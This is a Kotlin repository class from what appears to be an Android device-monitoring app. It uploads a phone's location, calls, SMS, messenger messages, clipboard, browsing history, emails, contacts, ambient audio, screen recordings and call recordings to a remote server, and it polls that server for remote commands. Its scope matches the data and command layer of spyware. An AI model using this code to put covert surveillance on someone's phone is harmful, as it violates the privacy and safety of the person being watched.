package com.devicemonitor.data.repository

import com.devicemonitor.data.api.RetrofitClient
import com.devicemonitor.data.models.AmbientRecording
import com.devicemonitor.data.models.AppUsage
import com.devicemonitor.data.models.CallLogEntry
import com.devicemonitor.data.models.CallRecording
import com.devicemonitor.data.models.ClipboardEntry
import com.devicemonitor.data.models.ContactEntry
import com.devicemonitor.data.models.DeviceInfo
import com.devicemonitor.data.models.EmailEntry
import com.devicemonitor.data.models.LocationEntry
import com.devicemonitor.data.models.MessengerMessage
import com.devicemonitor.data.models.NetworkInfo
import com.devicemonitor.data.models.RemoteCommand
import com.devicemonitor.data.models.RiskAlert
import com.devicemonitor.data.models.ScreenRecording
import com.devicemonitor.data.models.SmsEntry
import com.devicemonitor.data.models.WebHistory

class DeviceRepository {

    private val api = RetrofitClient.api

    suspend fun insertLocation(location: LocationEntry) {
        api.insertLocation(location)
    }

    suspend fun insertCallLog(callLog: CallLogEntry) {
        api.insertCallLog(callLog)
    }

    suspend fun insertSms(sms: SmsEntry) {
        api.insertSms(sms)
    }

    suspend fun insertMessengerMessage(message: MessengerMessage) {
        api.insertMessengerMessage(message)
    }

    suspend fun insertAppUsage(usage: AppUsage) {
        api.insertAppUsage(usage)
    }

    suspend fun insertNetworkInfo(networkInfo: NetworkInfo) {
        api.insertNetworkInfo(networkInfo)
    }

    suspend fun insertDeviceInfo(deviceInfo: DeviceInfo) {
        api.insertDeviceInfo(deviceInfo)
    }

    suspend fun insertClipboardEntry(entry: ClipboardEntry) {
        api.insertClipboardEntry(entry)
    }

    suspend fun insertWebHistory(webHistory: WebHistory) {
        api.insertWebHistory(webHistory)
    }

    suspend fun insertAmbientRecording(recording: AmbientRecording) {
        api.insertAmbientRecording(recording)
    }

    suspend fun insertScreenRecording(recording: ScreenRecording) {
        api.insertScreenRecording(recording)
    }

    suspend fun insertRiskAlert(alert: RiskAlert) {
        api.insertRiskAlert(alert)
    }

    suspend fun insertContact(contact: ContactEntry) {
        api.insertContact(contact)
    }

    suspend fun insertCallRecording(recording: CallRecording) {
        api.insertCallRecording(recording)
    }

    suspend fun insertEmailEntry(entry: EmailEntry) {
        api.insertEmailEntry(entry)
    }

    suspend fun getPendingCommands(deviceId: String): List<RemoteCommand> {
        val response = api.getPendingCommands(deviceId)
        return if (response.isSuccessful) {
            response.body() ?: emptyList()
        } else {
            emptyList()
        }
    }

    suspend fun updateCommandStatus(command: RemoteCommand) {
        api.updateCommandStatus(command)
    }
}
